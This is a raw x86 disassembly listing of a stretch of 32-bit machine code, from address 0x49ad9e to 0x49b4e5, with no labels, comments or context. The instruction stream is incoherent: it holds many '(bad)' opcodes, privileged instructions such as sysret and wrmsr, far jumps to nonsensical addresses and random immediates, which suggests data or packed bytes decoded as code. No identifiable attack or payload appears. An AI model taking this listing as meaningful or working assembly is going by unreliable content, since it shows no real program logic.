  49ad9e:	cmp    DWORD PTR [edi-0x4a2460be],esi
  49ada4:	sub    esp,DWORD PTR [eax]
  49ada6:	aaa    
  49ada7:	inc    ebp
  49ada8:	test   DWORD PTR [ebp+0x57],0x1b669b1
  49adaf:	jg     0x49ae10
  49adb1:	xor    eax,0x80920d57
  49adb6:	mov    ebx,0x527388f
  49adbb:	push   0x3
  49adbd:	inc    edx
  49adbe:	mov    bh,0x16
  49adc0:	push   0xaf073b1d
  49adc5:	jg     0x49add1
  49adc7:	je     0x49adf9
  49adc9:	mov    BYTE PTR [edi],ah
  49adcb:	jg     0x49ad94
  49adcd:	leave  
  49adce:	dec    eax
  49adcf:	pop    esp
  49add0:	rcr    BYTE PTR [edi+0x4],0x6c
  49add4:	outs   dx,BYTE PTR ds:[esi]
  49add5:	push   ecx
  49add6:	dec    edi
  49add7:	mov    ebp,DWORD PTR [edi-0x56]
  49adda:	adc    dl,ah
  49addc:	and    BYTE PTR [edi+0x7f],dh
  49addf:	push   ss
  49ade0:	add    eax,0x7f333b46
  49ade5:	push   edi
  49ade6:	fnstsw WORD PTR [eax+0x58]
  49ade9:	xchg   edi,eax
  49adea:	dec    edi
  49adeb:	outs   dx,DWORD PTR ds:[esi]
  49adec:	aaa    
  49aded:	fstp   QWORD PTR [eax+0x4f374c2a]
  49adf3:	xor    bh,BYTE PTR [edi+0x482b0331]
  49adf9:	aaa    
  49adfa:	aaa    
  49adfb:	push   ebp
  49adfc:	or     ecx,esp
  49adfe:	or     BYTE PTR [edi-0x253d3a11],ch
  49ae04:	mov    bh,BYTE PTR [ebx+0x3c14d7f7]
  49ae0a:	push   edx
  49ae0b:	pop    ebx
  49ae0c:	jmp    FWORD PTR [esi]
  49ae0e:	jg     0x49adc5
  49ae10:	or     DWORD PTR [ebp+0x7f8f8f18],0x16
  49ae17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49ae18:	and    DWORD PTR [eax+0x3f],esp
  49ae1b:	push   ecx
  49ae1c:	sub    dh,BYTE PTR [edi+eiz*1-0x59]
  49ae20:	xor    dl,BYTE PTR [edi+0xf]
  49ae23:	mov    ecx,0x2728b0c5
  49ae28:	mov    bh,0x17
  49ae2a:	push   ebx
  49ae2b:	sub    eax,0xdffac6ec
  49ae30:	cmovae ebx,DWORD PTR [edi+esi*1+0x6]
  49ae35:	adc    al,0x5f
  49ae37:	rdtsc  
  49ae39:	pop    esi
  49ae3a:	sbb    dl,BYTE PTR [edx+0xd]
  49ae3d:	iret   
  49ae3e:	getsec 
  49ae40:	les    edx,FWORD PTR [ecx-0x4f]
  49ae43:	not    BYTE PTR [edi+0x6f]
  49ae46:	lahf   
  49ae47:	xor    ebp,edx
  49ae49:	cmp    BYTE PTR [eax+0x14],cl
  49ae4c:	pop    edi
  49ae4d:	fbld   TBYTE PTR [edi-0x58]
  49ae50:	pop    eax
  49ae51:	adc    DWORD PTR [edx],esp
  49ae53:	iret   
  49ae54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49ae55:	adc    ecx,ebp
  49ae57:	xchg   BYTE PTR [esi-0x61],bl
  49ae5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49ae5b:	pusha  
  49ae5c:	or     eax,0x7fd7105a
  49ae61:	adc    eax,0x7fb031c3
  49ae66:	ja     0x49ae77
  49ae68:	jmp    0xb0c7:0xf851ac2
  49ae6f:	stos   BYTE PTR es:[edi],al
  49ae70:	ins    DWORD PTR es:[edi],dx
  49ae71:	sar    DWORD PTR [edi-0x61],1
  49ae74:	aaa    
  49ae75:	push   esi
  49ae76:	shl    DWORD PTR [edx+0x51],0xff
  49ae7a:	xor    dh,bh
  49ae7c:	lods   eax,DWORD PTR ds:[esi]
  49ae7d:	adc    BYTE PTR [ecx+eiz*1],0x57
  49ae81:	out    dx,eax
  49ae82:	stos   DWORD PTR es:[edi],eax
  49ae83:	inc    ecx
  49ae84:	fmul   DWORD PTR [ecx]
  49ae86:	dec    edi
  49ae87:	mov    ecx,0x770bab6a
  49ae8d:	xlat   BYTE PTR ds:[ebx]
  49ae8e:	das    
  49ae8f:	and    DWORD PTR [edx-0x20],esp
  49ae92:	adc    ah,BYTE PTR [esi]
  49ae94:	out    0xd7,eax
  49ae96:	sub    BYTE PTR [esi+0x5],dl
  49ae99:	(bad)  
  49ae9a:	(bad)  
  49ae9b:	aas    
  49ae9c:	adc    al,0x9d
  49ae9e:	mov    ds:0xdf37af63,eax
  49aea3:	push   0x5a
  49aea5:	int    0x8
  49aea7:	ja     0x49af18
  49aea9:	adc    dl,BYTE PTR [ebp+0x67efd0ba]
  49aeaf:	jmp    0x49aede
  49aeb1:	pop    edx
  49aeb2:	add    eax,0x318b6f57
  49aeb7:	or     BYTE PTR [ebp+0x75],ch
  49aeba:	(bad)  
  49aebb:	mov    edi,0x50a1c5ae
  49aec0:	and    esi,DWORD PTR [edi+0x7]
  49aec3:	test   BYTE PTR ds:0x679f63e1,dl
  49aec9:	push   ss
  49aeca:	xor    edx,DWORD PTR [eax+0xdff2f28]
  49aed0:	rol    DWORD PTR ds:0x5f348fcc,1
  49aed6:	cmp    BYTE PTR [esi-0x54],ch
  49aed9:	push   edx
  49aeda:	mov    edi,DWORD PTR [edi+0x219bfef]
  49aee0:	push   esi
  49aee1:	sub    al,0x77
  49aee3:	push   edi
  49aee4:	lds    ecx,FWORD PTR [ebx]
  49aee6:	xor    DWORD PTR [edi],ecx
  49aee8:	iret   
  49aee9:	fbstp  TBYTE PTR ds:0x12112262
  49aeef:	xlat   BYTE PTR ds:[ebx]
  49aef0:	pop    ds
  49aef1:	add    DWORD PTR [ebx],eax
  49aef3:	xlat   BYTE PTR ds:[ebx]
  49aef4:	add    bh,BYTE PTR [edi]
  49aef6:	xor    ebx,esi
  49aef8:	stos   BYTE PTR es:[edi],al
  49aef9:	(bad)  [edi+ebp*8-0x18f89151]
  49af00:	stos   DWORD PTR es:[edi],eax
  49af01:	(bad)  
  49af02:	or     BYTE PTR [eax],cl
  49af04:	aaa    
  49af05:	scas   eax,DWORD PTR es:[edi]
  49af06:	or     eax,0xc301e266
  49af0b:	lahf   
  49af0c:	and    DWORD PTR [esi],esi
  49af0e:	frstor [edx-0x79]
  49af11:	outs   dx,BYTE PTR ds:[esi]
  49af12:	pop    ds
  49af13:	jg     0x49aebb
  49af15:	mov    bh,0x12
  49af17:	pop    edx
  49af18:	xchg   DWORD PTR [ebx-0x71],eax
  49af1b:	and    DWORD PTR [eax-0x56],esp
  49af1e:	(bad)  
  49af1f:	div    DWORD PTR [esi]
  49af21:	nop
  49af22:	mov    al,BYTE PTR [ecx+edx*4]
  49af25:	xchg   DWORD PTR [edi],edx
  49af27:	and    BYTE PTR [ecx+esi*4+0x28],al
  49af2b:	daa    
  49af2c:	mov    bh,0xc4
  49af2e:	and    eax,0x462f110c
  49af33:	aas    
  49af34:	ror    BYTE PTR [edx-0x7c],cl
  49af37:	mov    ds:0x14184fc7,al
  49af3c:	les    esp,FWORD PTR [eax+0x2f]
  49af3f:	inc    edi
  49af40:	leave  
  49af41:	es add al,0x6a
  49af44:	mov    edi,0x75580937
  49af49:	popa   
  49af4a:	bndldx bnd1,[eax+0xf7f01c5]
  49af51:	cmp    BYTE PTR [esi],al
  49af53:	daa    
  49af54:	xor    DWORD PTR [edi],ecx
  49af56:	pop    ds
  49af57:	add    ch,0x5e
  49af5a:	or     BYTE PTR [edi-0x3175f861],al
  49af60:	inc    ecx
  49af61:	(bad)  
  49af62:	outs   dx,DWORD PTR ds:[esi]
  49af63:	xor    al,0x4f
  49af65:	or     eax,0x3318202b
  49af6a:	das    
  49af6b:	punpcklbw mm1,DWORD PTR [edx-0x1090929e]
  49af72:	xor    cl,BYTE PTR [esi+0x1f828c34]
  49af78:	packuswb mm1,QWORD PTR [esi]
  49af7b:	lods   al,BYTE PTR ds:[esi]
  49af7c:	or     DWORD PTR [ecx+0x469287f7],eax
  49af82:	loop   0x49af31
  49af84:	(bad)  
  49af85:	out    0x41,al
  49af87:	mov    ds:0x30616cd0,al
  49af8c:	pop    ds
  49af8d:	out    0x98,eax
  49af8f:	(bad)  
  49af90:	add    eax,0x9c2fc724
  49af95:	or     eax,DWORD PTR [edx-0x7c]
  49af98:	aas    
  49af99:	xor    al,0x62
  49af9b:	xor    eax,0x17df02ad
  49afa0:	dec    ebp
  49afa1:	lods   al,BYTE PTR ds:[esi]
  49afa2:	or     ch,BYTE PTR [edi+eiz*4+0x262c0cf]
  49afa9:	inc    esi
  49afaa:	iret   
  49afab:	adc    DWORD PTR [bp+di+0x4a62],ecx
  49afb0:	pop    ss
  49afb1:	rol    BYTE PTR [eax+0x2667115b],1
  49afb7:	pop    ds
  49afb8:	cmp    BYTE PTR [esi-0x6d],dl
  49afbb:	cs scas al,BYTE PTR es:[edi]
  49afbd:	mov    bh,0x1f
  49afbf:	sar    DWORD PTR [edx-0x6858cfaa],0x7f
  49afc6:	push   0xffffffac
  49afc8:	sub    ah,BYTE PTR [eax+0x27]
  49afcb:	mov    esi,0x92a4192d
  49afd0:	inc    esp
  49afd1:	pop    es
  49afd2:	sub    esi,DWORD PTR [esi]
  49afd4:	or     DWORD PTR [ebx],ecx
  49afd6:	(bad)  
  49afd7:	jnp    0x49b038
  49afd9:	jmp    0xc78a5dbe
  49afde:	pop    ss
  49afdf:	xlat   BYTE PTR ds:[ebx]
  49afe0:	add    edi,edx
  49afe2:	xor    DWORD PTR [ecx],esi
  49afe4:	pop    edi
  49afe5:	inc    edx
  49afe6:	div    DWORD PTR [edx]
  49afe8:	in     al,0x8a
  49afea:	pusha  
  49afeb:	adc    eax,0x2e353f0f
  49aff0:	xor    al,0x11
  49aff2:	mov    bh,0xbe
  49aff4:	ja     0x49b014
  49aff6:	stos   DWORD PTR es:[edi],eax
  49aff7:	adc    BYTE PTR [eax+0x3],bl
  49affa:	dec    edi
  49affb:	push   edi
  49affc:	push   es
  49affd:	dec    ebx
  49affe:	push   cs
  49afff:	(bad)  
  49b000:	fild   WORD PTR [edx-0x3a]
  49b003:	pop    eax
  49b004:	sbb    ecx,eax
  49b006:	add    DWORD PTR [esi+0x34],ebx
  49b009:	pop    ss
  49b00a:	mov    eax,ds:0xcf11ac40
  49b00f:	out    0x11,eax
  49b011:	mov    ds:0x929f5216,eax
  49b016:	ss inc esi
  49b018:	loope  0x49afb1
  49b01a:	out    0x8e,eax
  49b01c:	xor    al,0x50
  49b01e:	dec    ebx
  49b01f:	pop    esp
  49b020:	cmp    al,BYTE PTR [esi+0x2f]
  49b023:	out    dx,eax
  49b024:	cs in  al,dx
  49b026:	pop    edx
  49b027:	ret    
  49b028:	xor    bh,bh
  49b02a:	aas    
  49b02b:	jg     0x49b06e
  49b02d:	retf   0xb056
  49b030:	lahf   
  49b031:	pmulhw mm5,QWORD PTR [edx]
  49b034:	mov    al,0x6a
  49b036:	addr16 wrmsr 
  49b039:	aaa    
  49b03a:	push   ds
  49b03b:	mov    ?,WORD PTR [edx]
  49b03d:	daa    
  49b03e:	jnp    0x49b05f
  49b040:	das    
  49b041:	xchg   ebp,eax
  49b042:	popa   
  49b043:	pop    ebx
  49b044:	ret    
  49b045:	movsx  edx,WORD PTR [edi-0x12]
  49b049:	pop    edx
  49b04a:	mov    ch,0xd6
  49b04c:	inc    edi
  49b04d:	(bad)  
  49b04e:	aas    
  49b04f:	xor    eax,0x4b170a31
  49b054:	maxps  xmm0,xmm0
  49b057:	(bad)  
  49b058:	push   0x8
  49b05a:	call   edi
  49b05c:	mov    cl,0xa7
  49b05e:	inc    ebp
  49b05f:	test   BYTE PTR [edi-0x210b6069],ch
  49b065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49b066:	imul   ebp,DWORD PTR [edi],0x31bf472e
  49b06c:	sub    BYTE PTR [eax+0x37],0xef
  49b070:	push   edi
  49b071:	ret    0x582a
  49b074:	xchg   DWORD PTR [edi],esp
  49b076:	pop    edi
  49b077:	dec    ecx
  49b078:	or     BYTE PTR [ecx],ah
  49b07a:	pop    ebp
  49b07b:	xor    edx,DWORD PTR ss:[edi]
  49b07e:	cs ins DWORD PTR es:[edi],dx
  49b080:	adc    BYTE PTR [edi-0xb807911],ch
  49b086:	push   ss
  49b087:	pop    esp
  49b088:	arpl   WORD PTR [edi+0x43c2f797],bp
  49b08e:	imul   eax,DWORD PTR [ecx+0x2f],0x15063007
  49b095:	adc    BYTE PTR [edx-0x62e7d079],ch
  49b09b:	pop    edx
  49b09c:	xchg   edi,ebx
  49b09e:	jg     0x49b10d
  49b0a0:	adc    BYTE PTR [edx],bl
  49b0a2:	jmp    0xd64967b6
  49b0a7:	or     BYTE PTR [ebp-0x3ff800a6],bl
  49b0ad:	sbb    al,BYTE PTR [edx]
  49b0af:	pop    ebx
  49b0b0:	out    dx,eax
  49b0b1:	out    dx,eax
  49b0b2:	mov    ch,0x19
  49b0b4:	mov    DWORD PTR [eax-0x61],eax
  49b0b7:	xchg   ebp,edx
  49b0b9:	mov    ecx,0xdf775820
  49b0be:	inc    esi
  49b0bf:	out    0x2a,eax
  49b0c1:	push   esi
  49b0c2:	adc    BYTE PTR [eax-0x19],0x4f
  49b0c6:	stos   BYTE PTR es:[edi],al
  49b0c7:	xor    eax,0x313f8d70
  49b0cc:	pcmpeqb mm5,mm3
  49b0cf:	push   esi
  49b0d0:	rol    DWORD PTR [edi-0x76e778ba],cl
  49b0d6:	or     esi,DWORD PTR [esi]
  49b0d8:	inc    esp
  49b0d9:	scas   eax,DWORD PTR es:[edi]
  49b0da:	inc    edx
  49b0db:	jg     0x49b0a9
  49b0dd:	pop    edx
  49b0de:	shl    BYTE PTR ds:0x4827319f,cl
  49b0e4:	and    eax,DWORD PTR [edx+0x8ef861b]
  49b0ea:	inc    esp
  49b0eb:	xor    eax,0xc05f5f06
  49b0f0:	mov    al,ds:0x6fef736b
  49b0f5:	(bad)  
  49b0f7:	or     cl,BYTE PTR [ebx+0x29]
  49b0fa:	inc    edi
  49b0fb:	mov    ebx,0x6da9753f
  49b100:	pop    ebx
  49b101:	add    ebp,DWORD PTR [edi]
  49b103:	scas   eax,DWORD PTR es:[edi]
  49b104:	and    BYTE PTR [edi],dl
  49b106:	add    al,0x3b
  49b108:	pop    ds
  49b109:	push   DWORD PTR [ebx]
  49b10b:	and    BYTE PTR [ecx],al
  49b10d:	sub    edx,DWORD PTR [esi-0x1]
  49b110:	cmp    BYTE PTR [edi+esi*4+0x7f8b8f9a],al
  49b117:	add    al,0xc6
  49b119:	sub    al,0xac
  49b11b:	iret   
  49b11c:	adc    BYTE PTR es:[esp+edi*4+0x438f466f],0x44
  49b125:	mov    ebx,0xbfa71156
  49b12a:	daa    
  49b12b:	mov    ch,0x63
  49b12d:	lea    ecx,[eax-0x39]
  49b130:	lahf   
  49b131:	cdq    
  49b132:	arpl   di,ax
  49b134:	call   0x51b0:0x386f1727
  49b13b:	pop    ss
  49b13c:	or     eax,DWORD PTR [edi]
  49b13e:	jg     0x49b0ea
  49b140:	fistp  DWORD PTR [eax+0x33]
  49b143:	addr16 xchg edi,eax
  49b145:	stos   BYTE PTR es:[edi],al
  49b146:	ret    0x4260
  49b149:	outs   dx,DWORD PTR ds:[esi]
  49b14a:	ja     0x49b1ae
  49b14c:	pop    ebx
  49b14d:	(bad)  
  49b14e:	(bad)  
  49b14f:	out    dx,eax
  49b150:	jmp    0x49b17d
  49b152:	inc    esi
  49b153:	and    BYTE PTR [ecx],dh
  49b155:	pop    edi
  49b156:	pop    es
  49b157:	fistp  DWORD PTR [edx]
  49b159:	add    cl,BYTE PTR ss:[edi]
  49b15c:	aas    
  49b15d:	fwait
  49b15e:	mov    BYTE PTR [esp+ebp*4],dl
  49b161:	or     DWORD PTR [edi+0x3f],ebp
  49b164:	push   edx
  49b165:	fdivr  QWORD PTR [eax]
  49b167:	pop    eax
  49b168:	aas    
  49b169:	jg     0x49b142
  49b16b:	mov    cl,0x28
  49b16d:	sbb    BYTE PTR [eax],ch
  49b16f:	jg     0x49b1a1
  49b171:	push   gs
  49b173:	nop
  49b174:	mov    ch,0x8a
  49b176:	xchg   edi,eax
  49b177:	aas    
  49b178:	mov    ds:0xb7d918b1,eax
  49b17d:	mov    ds:0xd229939f,eax
  49b182:	rcl    DWORD PTR [edi],1
  49b184:	outs   dx,DWORD PTR ds:[esi]
  49b185:	xor    BYTE PTR ds:0x9f43aac0,dl
  49b18b:	mov    edi,0xbc29d4a
  49b190:	(bad)  
  49b191:	mov    edi,0x5c608950
  49b196:	jmp    FWORD PTR [edi+0x160c0b7c]
  49b19c:	jg     0x508148c9
  49b1a2:	sub    al,BYTE PTR [eax]
  49b1a4:	add    eax,0xb413de9f
  49b1a9:	and    bh,al
  49b1ab:	lahf   
  49b1ac:	(bad)  
  49b1ad:	push   ss
  49b1ae:	lods   al,BYTE PTR ds:[esi]
  49b1af:	arpl   sp,ax
  49b1b1:	inc    edi
  49b1b2:	pop    ds
  49b1b3:	pop    edi
  49b1b4:	imul   eax,edx,0xd
  49b1b7:	cmp    esp,edi
  49b1b9:	pop    es
  49b1ba:	aaa    
  49b1bb:	aas    
  49b1bc:	mov    DWORD PTR [eax-0x52e0fed3],ebx
  49b1c2:	sbb    dl,BYTE PTR [esi+0xa]
  49b1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49b1c6:	pop    edi
  49b1c7:	xor    DWORD PTR [eax+0x9],eax
  49b1ca:	dec    esi
  49b1cb:	pop    ss
  49b1cc:	aas    
  49b1cd:	cmp    BYTE PTR [eax-0x73],bl
  49b1d0:	ins    BYTE PTR es:[edi],dx
  49b1d1:	jmp    FWORD PTR [bx]
  49b1d4:	adc    eax,0x33ab6a11
  49b1d9:	ja     0x49b1ca
  49b1db:	inc    ecx
  49b1dc:	pushf  
  49b1dd:	int3   
  49b1de:	push   es
  49b1df:	jg     0x49b219
  49b1e1:	xor    al,0x1c
  49b1e3:	or     eax,0xe64fd483
  49b1e8:	(bad)  
  49b1ea:	lea    ebx,[edx]
  49b1ec:	xor    BYTE PTR [ecx],0x9f
  49b1ef:	out    dx,eax
  49b1f0:	or     eax,0xcf01456d
  49b1f5:	scas   eax,DWORD PTR es:[edi]
  49b1f6:	inc    esi
  49b1f7:	push   esi
  49b1f8:	and    BYTE PTR [ecx+0x11],0x27
  49b1fc:	(bad)  
  49b1fd:	push   ecx
  49b1fe:	fdiv   DWORD PTR [esi]
  49b200:	mov    al,BYTE PTR [edi+0x6f]
  49b203:	mov    bh,0x71
  49b205:	pop    esp
  49b206:	stos   DWORD PTR es:[edi],eax
  49b207:	pop    ds
  49b208:	ja     0x49b23d
  49b20a:	out    0xaa,eax
  49b20c:	adc    ch,0x56
  49b20f:	out    dx,eax
  49b210:	fbstp  TBYTE PTR ds:0x43e87129
  49b216:	fild   WORD PTR [edi-0x6f]
  49b219:	nop
  49b21a:	mov    ebx,0xdb313f80
  49b21f:	inc    esi
  49b220:	cmp    ebx,DWORD PTR [eax]
  49b222:	inc    edi
  49b223:	xor    eax,0xaa471f67
  49b228:	or     ebp,esp
  49b22a:	shr    BYTE PTR [edi],0xa7
  49b22d:	mov    ebx,0x5c2c3a10
  49b232:	mov    bl,BYTE PTR [edi]
  49b234:	mov    ah,0x69
  49b236:	pop    edx
  49b237:	xchg   edi,edx
  49b239:	push   DWORD PTR ds:0x685015ef
  49b23f:	sbb    ah,BYTE PTR [edi]
  49b241:	dec    edi
  49b242:	test   DWORD PTR [eax-0x50],edx
  49b245:	pop    ebp
  49b246:	cmova  edx,DWORD PTR ss:[ebx]
  49b24a:	mov    al,0x60
  49b24c:	ror    DWORD PTR [edi-0x4fbec8f9],0x1a
  49b253:	inc    edx
  49b254:	das    
  49b255:	jg     0x49b281
  49b257:	xor    al,0x22
  49b259:	mov    eax,0xda0f4732
  49b25e:	push   ss
  49b25f:	add    esi,DWORD PTR [eax-0x7ddf40a1]
  49b265:	(bad)  
  49b266:	call   0xa0f948aa
  49b26b:	pop    eax
  49b26c:	push   esp
  49b26d:	shl    BYTE PTR [edi],0x9f
  49b270:	pop    eax
  49b271:	shl    DWORD PTR [edx],0x19
  49b274:	inc    ebx
  49b275:	pop    es
  49b276:	push   ebp
  49b277:	adc    esi,DWORD PTR [edx+ebp*2-0x63eec069]
  49b27e:	or     DWORD PTR [edx+0x1d07350f],eax
  49b284:	pop    es
  49b285:	jmp    0x49b291
  49b287:	aas    
  49b288:	(bad)  
  49b289:	out    dx,eax
  49b28a:	aad    0x71
  49b28c:	add    BYTE PTR [eax],0x17
  49b28f:	out    dx,eax
  49b290:	mov    cl,0x6a
  49b292:	add    dh,cl
  49b294:	xor    DWORD PTR [edi+0x12],edi
  49b297:	and    BYTE PTR [eax+0x492a8708],dh
  49b29d:	shr    BYTE PTR [edx-0x7f3a50c1],0x15
  49b2a4:	or     eax,0x380b8f8f
  49b2a9:	xchg   esi,eax
  49b2aa:	cs (bad) 
  49b2ad:	pop    eax
  49b2ae:	add    edx,DWORD PTR [edx+0x24]
  49b2b1:	addr16 lahf 
  49b2b3:	test   eax,0xf6978c0
  49b2b8:	mul    DWORD PTR [edi]
  49b2ba:	(bad)  
  49b2bb:	mov    al,ds:0x8fff1131
  49b2c0:	sbb    edx,DWORD PTR [ecx+0x49]
  49b2c3:	add    ch,BYTE PTR [edi+0x37]
  49b2c6:	add    al,0x22
  49b2c8:	mov    ds,edx
  49b2ca:	lahf   
  49b2cb:	xor    BYTE PTR [edi+0x10],bh
  49b2ce:	or     dl,dl
  49b2d0:	push   edx
  49b2d1:	mov    edi,0x45586aff
  49b2d6:	or     ebp,edi
  49b2d8:	mov    edi,0xc2ad0a2f
  49b2dd:	aam    0x7f
  49b2df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49b2e0:	rcr    BYTE PTR [eax+0x372fb418],0x6e
  49b2e7:	pusha  
  49b2e8:	push   0x418fb7a1
  49b2ed:	sysret 
  49b2ef:	push   esi
  49b2f0:	dec    eax
  49b2f1:	and    al,0xa7
  49b2f3:	unpckhps xmm3,XMMWORD PTR [eax+0x14]
  49b2f7:	pop    esp
  49b2f8:	cmp    BYTE PTR [edi+0x57],ah
  49b2fb:	aad    0x44
  49b2fd:	and    BYTE PTR [eax+0x5f],0xa7
  49b301:	xor    eax,0xd76daaac
  49b306:	(bad)  
  49b307:	scas   eax,DWORD PTR es:[edi]
  49b308:	add    eax,0x274a8183
  49b30d:	daa    
  49b30e:	dec    ebp
  49b30f:	pop    edx
  49b310:	adc    eax,0x4aef4752
  49b315:	stos   DWORD PTR es:[edi],eax
  49b316:	pusha  
  49b317:	ins    DWORD PTR es:[edi],dx
  49b318:	das    
  49b319:	pop    edi
  49b31a:	shl    DWORD PTR [edx],0x22
  49b31d:	jmp    0x82c99241
  49b322:	inc    ebp
  49b323:	xor    eax,0x7f374100
  49b328:	and    DWORD PTR [ebx+0x45],eax
  49b32b:	sub    BYTE PTR [edi+0x43],bh
  49b32e:	or     edx,DWORD PTR [esi-0x13]
  49b331:	push   0x27
  49b333:	scas   eax,DWORD PTR es:[edi]
  49b334:	pop    es
  49b335:	fisub  DWORD PTR [ebp+0x79f1b15]
  49b33b:	inc    ebp
  49b33c:	lods   al,BYTE PTR ds:[esi]
  49b33d:	mov    bh,0x10
  49b33f:	aas    
  49b340:	lahf   
  49b341:	(bad)  
  49b342:	push   ss
  49b343:	adc    BYTE PTR [edx+ebp*4-0x55e91091],ch
  49b34a:	push   es
  49b34b:	xchg   ebx,eax
  49b34c:	das    
  49b34d:	aaa    
  49b34e:	pop    edi
  49b34f:	mov    DWORD PTR ds:0xa745864c,edx
  49b355:	add    edx,DWORD PTR [eax]
  49b357:	test   BYTE PTR [edx-0x55b9f041],bh
  49b35d:	dec    eax
  49b35e:	xor    DWORD PTR [edx],ebx
  49b360:	dec    DWORD PTR [edi]
  49b362:	push   eax
  49b363:	add    al,0x4b
  49b365:	push   es
  49b366:	inc    esp
  49b367:	dec    edi
  49b368:	push   cs
  49b369:	mov    ch,0x38
  49b36b:	mov    eax,ds:0xd2330e87
  49b370:	add    BYTE PTR [ecx],0x49
  49b373:	ja     0x49b37c
  49b375:	nop
  49b376:	push   0xffffff9d
  49b378:	xlat   BYTE PTR ds:[ebx]
  49b379:	inc    edi
  49b37a:	ja     0x49b329
  49b37c:	add    ch,ch
  49b37e:	pop    edx
  49b37f:	das    
  49b380:	pop    ds
  49b381:	and    DWORD PTR [esi+0x3f2f2954],ebp
  49b387:	je     0x49b396
  49b389:	push   es
  49b38a:	adc    cl,BYTE PTR [edi-0x41]
  49b38d:	xor    BYTE PTR [edi-0x1878dd9a],0x20
  49b394:	xor    eax,0xf5f3b0a
  49b399:	xor    al,0x84
  49b39b:	sub    BYTE PTR [esi-0x29],dh
  49b39e:	dec    edi
  49b39f:	cmovp  esp,DWORD PTR [ebx+0x0]
  49b3a3:	mov    cl,BYTE PTR [edi+0x210df42]
  49b3a9:	add    ah,BYTE PTR [edi+ebp*2]
  49b3ac:	add    BYTE PTR [ebx+0x49f1290],cl
  49b3b2:	mov    eax,0xef37e8a2
  49b3b7:	inc    ebx
  49b3b8:	pop    edi
  49b3b9:	and    DWORD PTR [ebp+ecx*4-0x7540b8a6],esi
  49b3c0:	mov    al,0xe
  49b3c2:	lods   al,BYTE PTR ds:[esi]
  49b3c3:	aas    
  49b3c4:	pop    edi
  49b3c5:	neg    DWORD PTR [edi]
  49b3c7:	mov    edx,0xef0285d6
  49b3cc:	jg     0x49b351
  49b3ce:	fist   DWORD PTR [esi+0x7b]
  49b3d1:	xchg   edi,eax
  49b3d2:	addr16 push edi
  49b3d4:	(bad)  
  49b3d5:	xchg   edi,eax
  49b3d6:	aad    0x2a
  49b3d8:	fdiv   DWORD PTR [esi+0x373feb0f]
  49b3de:	and    DWORD PTR [ebx+0x39b758c8],0x4c80bd02
  49b3e8:	addr16 xor edi,ebp
  49b3eb:	lahf   
  49b3ec:	mov    ah,0xa2
  49b3ee:	push   ecx
  49b3ef:	mov    ah,0x6f
  49b3f1:	pop    es
  49b3f2:	sbb    eax,eax
  49b3f4:	test   DWORD PTR [eax+0x222b8e5f],ebx
  49b3fa:	and    BYTE PTR [edi+ecx*4-0x31],dh
  49b3fe:	mov    edx,DWORD PTR [edx]
  49b400:	outs   dx,DWORD PTR ds:[esi]
  49b401:	add    eax,0x6d8767af
  49b406:	mov    al,0x15
  49b408:	push   0x6a81afcf
  49b40d:	inc    ecx
  49b40e:	add    bh,cl
  49b410:	aaa    
  49b411:	popf   
  49b412:	les    edx,FWORD PTR [ebp-0x4c]
  49b415:	xor    BYTE PTR [ebx],al
  49b417:	inc    ebx
  49b418:	pop    eax
  49b41a:	jbe    0x49b39d
  49b41c:	dec    edx
  49b41d:	xchg   DWORD PTR [edi+0x23],ecx
  49b420:	jbe    0x49b3e6
  49b422:	mov    dh,0x1b
  49b424:	aas    
  49b425:	xor    al,bl
  49b427:	add    ebx,DWORD PTR [eax+0x6c]
  49b42a:	sbb    edx,DWORD PTR [edi+0x44]
  49b42d:	sub    eax,0x7077518
  49b432:	add    al,0x23
  49b434:	and    bl,BYTE PTR [eax-0x25]
  49b437:	out    0x7f,eax
  49b439:	xchg   BYTE PTR [esi],cl
  49b43b:	add    al,BYTE PTR [ebx]
  49b43d:	xor    eax,0x95da462f
  49b442:	pop    eax
  49b443:	sar    BYTE PTR [ebx-0x3d80bc55],1
  49b449:	inc    esp
  49b44a:	sbb    eax,0x2b341f23
  49b44f:	or     dl,BYTE PTR [esi-0x25]
  49b452:	dec    edi
  49b453:	jg     0x49b4b1
  49b455:	fimul  DWORD PTR [edx-0x1f8bd7e]
  49b45b:	cmp    DWORD PTR [ebx],esi
  49b45d:	adc    dh,BYTE PTR [edx+0x507f1506]
  49b463:	sbb    cl,BYTE PTR [edx+0x417f2fad]
  49b469:	imul   ecx,DWORD PTR [eax+0x7feb1482],0x42
  49b470:	mov    esi,0xe742ad82
  49b475:	push   DWORD PTR [edi]
  49b477:	add    BYTE PTR [ecx-0x54],al
  49b47a:	ret    0x488d
  49b47d:	jle    0x49b456
  49b47f:	shl    BYTE PTR ds:0x57071146,1
  49b485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49b486:	adc    al,0xed
  49b488:	fisubr DWORD PTR [edi-0x3fb65f01]
  49b48e:	mov    ch,0x43
  49b490:	(bad)  
  49b491:	ins    DWORD PTR es:[edi],dx
  49b492:	pushf  
  49b493:	adc    al,0x35
  49b495:	pop    es
  49b496:	sti    
  49b497:	lods   al,BYTE PTR ds:[esi]
  49b498:	mov    ah,0xb6
  49b49a:	add    BYTE PTR [edi+0x27],bh
  49b49d:	add    eax,0x71146eb
  49b4a2:	jle    0x49b4b1
  49b4a4:	pusha  
  49b4a5:	inc    esp
  49b4a6:	pop    ebx
  49b4a7:	out    0xff,eax
  49b4a9:	shr    BYTE PTR [eax],1
  49b4ab:	pusha  
  49b4ac:	test   ebx,edi
  49b4ae:	out    0x82,eax
  49b4b0:	in     al,0xa9
  49b4b2:	sbb    bh,dh
  49b4b4:	inc    ebp
  49b4b5:	inc    ebp
  49b4b6:	pop    eax
  49b4b7:	or     DWORD PTR ds:0x773217c6,edi
  49b4bd:	mov    eax,0x7228d27
  49b4c2:	(bad)  
  49b4c4:	cmp    ah,BYTE PTR [ebp*4-0x54640098]
  49b4cb:	xor    eax,0x3907c110
  49b4d0:	repz inc esi
  49b4d2:	mov    ah,0x23
  49b4d4:	or     DWORD PTR [ebx+0xbac10ff],esp
  49b4da:	adc    dl,BYTE PTR [edi-0x7954fdf9]
  49b4e0:	inc    edx
  49b4e1:	aas    
  49b4e2:	inc    eax
  49b4e3:	and    al,0xf
  49b4e5:	dec    ebp
